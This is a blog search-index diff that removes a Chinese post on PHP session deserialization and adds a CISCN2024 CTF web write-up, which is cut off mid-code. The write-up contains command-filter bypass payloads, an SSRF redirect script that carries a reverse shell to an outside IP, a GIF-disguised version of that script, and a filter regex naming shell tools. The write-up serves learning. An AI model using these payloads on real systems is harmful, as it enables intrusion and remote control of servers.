+  <entry>
     <title>nodejs-ctfshow</title>
     <url>/2024/03/02/nodejs-ctfshow/</url>
     <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
@@ -919,70 +845,6 @@
       <tags>
         <tag>ctf</tag>
         <tag>Nodejs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php_Session反序列化学习</title>
-    <url>/2024/02/25/php-Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="php反序列化的一种"><a href="#php反序列化的一种" class="headerlink" title="php反序列化的一种"></a>php反序列化的一种</h1><span id="more"></span>
-
-<h1 id="从开发者角度认识session"><a href="#从开发者角度认识session" class="headerlink" title="从开发者角度认识session"></a>从开发者角度认识session</h1><h2 id="为什么需要session"><a href="#为什么需要session" class="headerlink" title="为什么需要session"></a>为什么需要session</h2><p>由于http协议是无状态的，所以我们需要一种基于http的技术让服务器识别用户的状态，以达到防护，提供用户个性化资源，记录用户操作等目的</p>
-<h1 id="session一些特性"><a href="#session一些特性" class="headerlink" title="session一些特性"></a>session一些特性</h1><p>相比于cookie，session主要由sessionid和它所带的值组成，而session存储在客户端和服务端两端，客户端只存储sessionid，服务端两个都存。</p>
-<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>如果我想通过session实现一个功能——当用户登录时，页面会显示”你好!xxx”</p>
-<p>简单写个前后端</p>
-<p>注册</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184635095.png"  alt="image-20240225184635095"></p>
-<p>填入后可以看到在tem目录下的session文件</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184701936.png"  alt="image-20240225184701936"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184712646.png"  alt="image-20240225184712646"></p>
-<p>登录</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240225185914591.png"  alt="image-20240225185914591"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240225185932722.png"  alt="image-20240225185932722"></p>
-<p>我们就实现了这个功能</p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>前面提到用户的输入会以序列化的形式存储在session中，php给我们提供了三种处理引擎，由<code>session.serialize_handler</code>来设置</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226152937389.png"  alt="image-20240226152937389"></p>
-<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>存储格式:键名+竖线+经过<code>serialize()</code>函数序列化处理的值</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226152654358.png"  alt="image-20240226152654358"></p>
-<p>这里竖线前面的user是<code>$_SESSION[&#39;user&#39;]</code>里的user，竖线后面的user是类名</p>
-<h3 id="php-binary"><a href="#php-binary" class="headerlink" title="php_binary"></a>php_binary</h3><p>键名的长度对应的ASCII字符+键名+经过<code>serialize()</code>函数序列化处理的值</p>
-<p>对比上面的php其实也就多个ASCII字符,少个竖线</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226153657091.png"  alt="image-20240226153657091"></p>
-<p>为了更直观，我把键名写到33个字符，33对应的ASCII字符为!</p>
-<h3 id="php-serialize"><a href="#php-serialize" class="headerlink" title="php_serialize"></a>php_serialize</h3><p>经过<code>serialize()</code>函数序列化处理的__数组__</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226154036903.png"  alt="image-20240226154036903"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226154420821.png"  alt="image-20240226154420821"></p>
-<p>a表示的是SESSION数组中有几个元素，花括号里包括序列化后的数据，这里的键名也需要<code>s::;</code>的表达</p>
-<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>当两个文件所用的处理器不相同时，且SESSION数组内的值可控时，我们就可以构造恶意数据来进行操作</p>
-<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>我在注册这边使用的是php_binary处理器，登录那边用的是php处理器</p>
-<p>注册这边它的用户名，和密码都是可控的，如果我们正常输入，它会这样存入</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226161914641.png"  alt="image-20240226161914641"></p>
-<p>我们就可以在username的属性动一些手脚达到改属性的目的，这里把Ewoji改为了Emoji</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226164258514.png"  alt="image-20240226164258514"></p>
-<p>之后再打开登录文件</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226162151930.png"  alt="image-20240226162151930"></p>
-<p>修改成功</p>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>这里是由|产生了歧义，php处理器把|后面的东西当作对象反序列化了</p>
-<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="CTFSHOW-web-263"><a href="#CTFSHOW-web-263" class="headerlink" title="CTFSHOW web-263"></a>CTFSHOW web-263</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240226164651595.png"  alt="image-20240226164651595"></p>
-<p>题面，看源码，抓包无果，直接开扫</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226164731869.png"  alt="image-20240226164731869"></p>
-<p><a class="link"   href="http://www.zip,下载,打开/" >www.zip,下载，打开<i class="fas fa-external-link-alt"></i></a></p>
-<p>发现漏洞点</p>
-<p>1.写入SESSION:原本用来记录limit的值可以修改</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185421699.png"  alt="image-20240226185421699"></p>
-<p>2.写入文件:<code>file_put_contents()</code>,这里的意思是用用户输入的username为一个log-xxx的日志文件命名，写入的内容password可以用反序列修改，这就可以直接写马</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185527715.png"  alt="image-20240226185527715"></p>
-<p>3.触发反序列化，这里的&#x2F;inc&#x2F;inc.php是不可访问的，但是check.php没有禁止访问而且它包含了inc.php，访问check.php即可触发反序列化</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185757295.png"  alt="image-20240226185757295"></p>
-<p>最后的payload如下 :</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185841358.png"  alt="image-20240226185841358"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185855523.png"  alt="image-20240226185855523"></p>
-<p>然后连接读取flag即可</p>
-]]></content>
-      <categories>
-        <category>技术探索</category>
-      </categories>
-      <tags>
-        <tag>php</tag>
       </tags>
   </entry>
   <entry>
@@ -1115,6 +977,144 @@
       <tags>
         <tag>ctf</tag>
         <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CISCN2024-web复现</title>
+    <url>/2024/05/21/CISCN2024-web%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="初遇国赛"><a href="#初遇国赛" class="headerlink" title="初遇国赛"></a>初遇国赛</h1><span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次打国赛，难度还是很大的，一题做一天唉，如图所示(2&#x2F;6)</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240521223322525.png"  alt="image-20240521223322525"></p>
+<p>说实话我认为我能做四题的，第一天一直在看Simple_php，最后十分钟打出来了，打得我都发抖了，然后第二天才开始看的cms，星期天刚刚到实验室打开电脑就看到大B哥捷报传来</p>
+<p><img   src="/../img/$%7Bfiilename%7D/2ea692c2a181a4ef0ae6828c46b8f539.jpg"  alt="2ea692c2a181a4ef0ae6828c46b8f539"></p>
+<p>五分钟拿下一血，你知道的，大b哥依旧这么强。</p>
+<p>之后就开始了漫长的坐牢生活，一直审源码审到三点才做了出来</p>
+<p>最后实在太累了，有种想死的无力感，随便打开题看看，开了个mossfen，给了源码一看，就知道是python沙盒栈帧逃逸，在中国海洋大学新生赛写过，但是没写出来，赛后也没看，好像考试前看过原题但是记不起来的感觉，最后实在累了，懒得看了。最后两个小时就随便看看密码和杂项（虽然一个没打出来就是了）</p>
+<p>赛后水了水群，才知道mossfen这题和中海大的菜鸟工具2确实是同一个出题人，于是我痛定思痛，每次比赛后都要好好复现，所以便有了这篇文章</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240521224229311.png"  alt="image-20240521224229311"></p>
+<p>HnuSec_5拿了个校内队第5，很会预言的名字，这使我大脑旋转</p>
+<p><img   src="/../img/$%7Bfiilename%7D/ok.jpg"  alt="ok"></p>
+<h1 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple_php"></a>Simple_php</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">     <span class="keyword">if</span>      (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">         <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>很干练的一题rce，没有整活，你执行不了都不给你个回显</p>
+<p>这边开局看到了<code>escapeshelllcmd()</code>，于是上网查，并且搜索相关绕过和漏洞，学到了一下信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当$cmd中包含‘&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$, \x0A 和 \xFF’任意一个，这个函数都会在前面加个转义字符，为什么会这样呢，因为这些东西在linux命令行中都是特别的存在，允许我们玩很多绕过的花招</span><br><span class="line">&amp;:可当命令的分隔符，也可以与&gt;&lt;组成重定向的文件合并，比如我们常见的反弹shell</span><br><span class="line">#:linux命令行的注释符(终止符)</span><br><span class="line">;:分隔符</span><br><span class="line">`:`cat flag`=&gt;flag&#123;ewoji_0000_114614&#125;</span><br><span class="line">|:隔开两个命令，并把上一个命令的输出当作下个命令的输入,ls | grep &#x27;flag&#x27;</span><br><span class="line">*:匹配任意个数任意字符fla?.php</span><br><span class="line">?:匹配一个任意字符f*</span><br><span class="line">~:cd ~切换到home目录</span><br><span class="line">&lt;&gt;:重定向符,可以使用cat&lt;flag.php绕过空格</span><br><span class="line">^:未知，似乎没找到什么有用的</span><br><span class="line">():无需多言</span><br><span class="line">[]:[A-Za-z0-9]表示所有字符数字，[a-c]表示abc,[-%] ”代表“ [!”#$%] </span><br><span class="line">&#123;&#125;:&#123;e,w,o,j,i&#125;可表示里面的任意字符，这个非常好用，[]只能在参数部分匹配，而&#123;&#125;甚至可以在命令部分匹配</span><br><span class="line"></span><br><span class="line">$:1.可以表示一个变量，作变量拼接a=f;b=l;c=a;d=g,$a$b$c$d=flag</span><br><span class="line">  2.可以表示一个空变量绕过空格,$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;=10) :比如ca$&#123;21&#125;t a.txt表示cat a.txt 在没有传入参数的情况下,这些特殊字符默认为空,如下:wh$1oami,who$@ami,whoa$*mi</span><br><span class="line">  3.可以看一些环境变量,echo $PATH,echo $SHELL</span><br><span class="line">  4.可以配合&#123;&#125;截取字母，如$&#123;PATH:5:1&#125;=&gt;l($PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin)</span><br><span class="line">  </span><br><span class="line">\x0A:换行符</span><br><span class="line">\xFF:不明白的神秘符号</span><br></pre></td></tr></table></figure>
+
+<p>咳咳，然后呢，搜了一大堆相关漏洞，什么宽字节都出来了，还是打不通，索性从绕过这个函数放弃</p>
+<p>然后望着一望无际的disable_functions思考人生</p>
+<p>一直在思考这个转义字符能有什么用，于是我开启了第一波尝试</p>
+<p>payload:<code>php -r var_dump(1);</code></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240522125934038.png"  alt="image-20240522125934038"></p>
+<p>执行了？为什么？</p>
+<p><a class="link"   href="https://www.cnblogs.com/jycjy/p/6937667.html" >Shell命令行中特殊字符与其转义详解(去除特殊含义) - 酸奶加绿茶 - 博客园 (cnblogs.com)<i class="fas fa-external-link-alt"></i></a></p>
+<p>一个命令的执行应该包括 命令+选项+参数，且顺序不能变</p>
+<p>就好比你<code>ls &gt; test.txt</code>可以成功而<code>test.txt &lt; ls</code>会报错说没有ls这个文件</p>
+<p>命令和选项按顺序填好后，就是参数了，参数不是特殊字符，当参数包含特殊字符时需要转义</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240522131043137.png"  alt="image-20240522131043137"></p>
+<p>执行了两个不同的命令，取决于&amp;有没有被转义，这里我用了’’去转义&amp;，你也可以使用””或\去转义</p>
+<p>这样就可以解释了我的 <code>php -r var_dump\(1\)\;</code>为什么执行了，特殊字符被转义，实际上执行的就是<code>php -r var_dump(1)</code></p>
+<p><strong>所以说有时候限制我们的，换个角度看，就可以变成帮助我们的</strong></p>
+<p>所以接下来只需要编码绕过disable_functions即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1:cmd=php -r eval(hex2bin(substr(_73797374656d28276c7327293b,1)));=&gt;system(&#x27;ls&#x27;);</span><br><span class="line">这里涉及到php一个特性,php的常量命名方式是下划线+字母，当你尝试</span><br><span class="line">echo _123;会报错，但是会正常输出_123</span><br><span class="line">这也就是为什么我们可以正常获得_后的字符串</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload2:cmd=eval `ec\ho bHM=|base\64 -d`=&gt;eval &#x27;ls&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>rce之后记得flag在数据库里面。。。。。。。。。。。。。。。。。。。</p>
+<p><code>mysql -u root -proot -e xxxxx</code></p>
+<h1 id="easycms-easycms-revenge"><a href="#easycms-easycms-revenge" class="headerlink" title="easycms&amp;&amp;easycms_revenge"></a>easycms&amp;&amp;easycms_revenge</h1><h3 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h3><p>一个hint:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;</span>;</span><br><span class="line"> <span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>REMOTE_ADDR不可伪造，需要找ssrf</p>
+<p>其实一开始还去试了试删除install.lock，但是要找admin后台还要登录，做了一大堆无用功后我才想到要进行ssrf的</p>
+<p>既然要请求外部的资源，自然而然的想到api模块，于是打开源码开始审计api模块，貌似有20多个api，一个一个往下审，发现第三个可以用，还算运气好了，当时已经准备死磕这里了</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 二维码显示</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">qrcode</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">urldecode</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;text&#x27;</span>));</span><br><span class="line">    <span class="variable">$thumb</span> = <span class="title function_ invoke__">urldecode</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;thumb&#x27;</span>));</span><br><span class="line">    <span class="variable">$matrixPointSize</span> = (<span class="keyword">int</span>)<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;size&#x27;</span>);</span><br><span class="line">    <span class="variable">$errorCorrectionLevel</span> = <span class="title function_ invoke__">dr_safe_replace</span>(<span class="title class_">\Phpcmf\Service</span>::<span class="title function_ invoke__">L</span>(<span class="string">&#x27;input&#x27;</span>)-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;level&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//生成二维码图片</span></span><br><span class="line">    <span class="keyword">require_once</span> CMSPATH.<span class="string">&#x27;Library/Phpqrcode.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$file</span> = WRITEPATH.<span class="string">&#x27;file/qrcode-&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>.<span class="variable">$thumb</span>.<span class="variable">$matrixPointSize</span>.<span class="variable">$errorCorrectionLevel</span>).<span class="string">&#x27;-qrcode.png&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="variable">$QR</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title class_">\QRcode</span>::<span class="title function_ invoke__">png</span>(<span class="variable">$value</span>, <span class="variable">$file</span>, <span class="variable">$errorCorrectionLevel</span>, <span class="variable">$matrixPointSize</span>, <span class="number">3</span>);</span><br><span class="line">        <span class="variable">$QR</span> = <span class="title function_ invoke__">imagecreatefromstring</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$thumb</span>) &#123;</span><br><span class="line">            <span class="variable">$logo</span> = <span class="title function_ invoke__">imagecreatefromstring</span>(<span class="title function_ invoke__">dr_catcher_data</span>(<span class="variable">$thumb</span>));</span><br><span class="line">            <span class="variable">$QR_width</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$QR</span>);<span class="comment">//二维码图片宽度</span></span><br><span class="line">            <span class="variable">$QR_height</span> = <span class="title function_ invoke__">imagesy</span>(<span class="variable">$QR</span>);<span class="comment">//二维码图片高度</span></span><br><span class="line">            <span class="variable">$logo_width</span> = <span class="title function_ invoke__">imagesx</span>(<span class="variable">$logo</span>);<span class="comment">//logo图片宽度</span></span><br><span class="line">            <span class="variable">$logo_height</span> = <span class="title function_ invoke__">imagesy</span>(<span class="variable">$logo</span>);<span class="comment">//logo图片高度</span></span><br><span class="line">            <span class="variable">$logo_qr_width</span> = <span class="variable">$QR_width</span> / <span class="number">4</span>;</span><br><span class="line">            <span class="variable">$scale</span> = <span class="variable">$logo_width</span>/<span class="variable">$logo_qr_width</span>;</span><br><span class="line">            <span class="variable">$logo_qr_height</span> = <span class="variable">$logo_height</span>/<span class="variable">$scale</span>;</span><br><span class="line">            <span class="variable">$from_width</span> = (<span class="variable">$QR_width</span> - <span class="variable">$logo_qr_width</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="comment">//重新组合图片并调整大小</span></span><br><span class="line">            <span class="title function_ invoke__">imagecopyresampled</span>(<span class="variable">$QR</span>, <span class="variable">$logo</span>, <span class="variable">$from_width</span>, <span class="variable">$from_width</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="variable">$logo_qr_width</span>, <span class="variable">$logo_qr_height</span>, <span class="variable">$logo_width</span>, <span class="variable">$logo_height</span>);</span><br><span class="line">            <span class="title function_ invoke__">imagepng</span>(<span class="variable">$QR</span>, <span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出图片</span></span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">ob_clean</span>();</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: image/png&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">ImagePng</span>(<span class="variable">$QR</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一个可以请求外部资源并且生成二维码的api</p>
+<p>先看大意:</p>
+<p>1.接收4个参数，其中text,size,level是关于二维码的信息,thumb是关于logo的信息,logo就有时候在二维码中间的那个小图片</p>
+<p>2.用四个参数命名为一个文件名，如果存在则直接读出$QR(图片对象),若不存在则创建一个图片对象</p>
+<p>3.检测是否需要logo，如果需要logo，就重新调整图片并且插入logo</p>
+<p>所以说，logo图片是可以请求外部资源获得的,那就看看它怎么来的</p>
+<p><code>$logo = imagecreatefromstring(dr_catcher_data($thumb));</code></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240523173818570.png"  alt="image-20240523173818570"></p>
+<p>ssrf入口点找到了,于是在自己的vps写好跳转,然后在cmd上写上反弹shell命令即可</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target_url</span> = <span class="string">&quot;http://127.0.0.1/flag.php?cmd=php+-r+%27%24sock%3dfsockopen(%2247.100.177.241%22%2c23333)%3bexec(%22bash+%3c%263+%3e%263+2%3e%263%22)%3b%27&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span> . <span class="variable">$target_url</span>,<span class="literal">true</span>,<span class="number">302</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload:<code>http://eci-2ze3cmcfbu4hoso5luoc.cloudeci1.ichunqiu.com/index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=Your vps&amp;text=1&amp;size=1&amp;level=1</code></p>
+<p>发现有个可执行文件readflag,.&#x2F;readflag即可</p>
+<h3 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h3><p>前面步骤一样，主要是对logo的请求有了过滤，需要对文件进行伪造，类型文件上传的图片马吧，超链接直接连接资源，所以文件名不会被检测（我的理解），所以伪造内容就好</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line">GIF89a<span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeewwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooojjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$target_url</span> = <span class="string">&quot;http://127.0.0.1/flag.php?cmd=php+-r+%27%24sock%3dfsockopen(%2247.100.177.241%22%2c23333)%3bexec(%22bash+%3c%263+%3e%263+2%3e%263%22)%3b%27&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span> . <span class="variable">$target_url</span>,<span class="literal">true</span>,<span class="number">302</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看了一下别人wp发现有非预期，有个down_img，但是我死活找不到，可能是我下载的源码的问题？？？这出题人不给个附件有点顶不得</p>
+<h1 id="mossfern"><a href="#mossfern" class="headerlink" title="mossfern"></a>mossfern</h1><p>给了两个附件</p>
+<p>main.py</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">from</span> uuid <span class="keyword">import</span> uuid1</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">runner = <span class="built_in">open</span>(<span class="string">&quot;/app/runner.py&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).read()</span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).readline().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">str</span>(uuid1())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(</span><br><span class="line">            runner.replace(<span class="string">&quot;THIS_IS_SEED&quot;</span>, flag).replace(<span class="string">&quot;THIS_IS_TASK_RANDOM_ID&quot;</span>, <span class="built_in">id</span>))</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(data.get(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">        run = subprocess.run(</span><br><span class="line">            [<span class="string">&#x27;python&#x27;</span>, <span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>],</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.PIPE,</span><br><span class="line">            timeout=<span class="number">3</span></span><br><span class="line">        )</span><br><span class="line">        result = run.stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        error = run.stderr.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(result, error)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;result&#125;</span>\n<span class="subst">&#123;error&#125;</span>&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">          